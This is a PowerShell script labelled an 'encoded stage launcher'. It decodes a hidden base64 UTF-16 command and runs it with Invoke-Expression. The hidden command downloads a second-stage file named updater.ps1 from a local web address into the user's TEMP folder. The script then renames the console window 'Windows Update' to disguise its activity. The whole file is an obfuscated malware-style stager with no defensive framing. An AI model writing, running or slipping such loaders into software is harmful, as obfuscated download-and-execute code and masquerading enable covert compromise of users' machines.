
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 38
)
$Base64Text = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AbABvAGMAYQBsAGgAbwBz" +
    "AHQAOgA4ADAAMAAwAC8AdQBwAGQAYQB0AGUAcgAuAHAAcwAxACIAOwAgAEkAbgB2AG8AawBlAC0A" +
    'VwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFMAdABhAGcAZQAyAFUAcgBsACAALQBP' +
    'AHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdABhAGcAZQAyAC4AYgBpAG4A' +
    "IgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA"
)
$DecodedText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Base64Text))
try {
    Write-Verbose ("Decoded stage length: " + $DecodedText.Length)
    if ([string]::IsNullOrWhiteSpace($DecodedText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $DecodedText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Write-Verbose "stage marker 14 reached"
$Host.UI.RawUI.WindowTitle = "Windows Update"
